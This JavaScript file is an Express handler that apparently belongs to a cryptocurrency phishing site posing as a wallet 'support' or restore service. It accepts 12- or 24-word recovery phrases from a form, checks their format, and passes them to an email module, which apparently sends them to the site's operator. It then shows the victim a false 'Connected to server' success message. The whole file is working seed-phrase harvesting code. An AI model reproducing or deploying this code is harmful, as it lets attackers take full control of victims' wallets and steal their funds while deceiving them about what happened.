const { phrase12, phrase24 } = require("../validation/restoreWallet");
const sendEmail = require("../emails/restoreWallet");

module.exports = async (req, res) => {
  try {
    const type = req.query.type;

    // 12 word key-phrase
    if (type === "12") {
      // Validate inputss
      const restoreWalletValid = phrase12.validate(req.body);
      if (restoreWalletValid.error) {
        return res.status(400).render("support", {
          formSection: type,
          form: req.body,
          alert: { status: "error", message: restoreWalletValid.error.message },
        });
      }

      delete req.body.checkbox;

      // Send email
      const sentMail = await sendEmail(req.body, type);
      console.log(sentMail);

      // 24 word key-phrase
    } else if (type === "24") {
      // Validate inputss
      const restoreWalletValid = phrase24.validate(req.body);
      if (restoreWalletValid.error) {
        return res.status(400).render("support", {
          formSection: type,
          form: req.body,
          alert: { status: "error", message: restoreWalletValid.error.message },
        });
      }

      delete req.body.checkbox;

      // Send email
      const sentMail = await sendEmail(req.body, type);
      console.log(sentMail);
    }

    return res.status(400).render("support", {
      formSection: type,
      form: req.body,
      alert: { status: "success", message: "Connected to server" },
    });
  } catch (error) {
    console.log("ERROR RESTORING WALLET");
    console.log(error);
  }
};
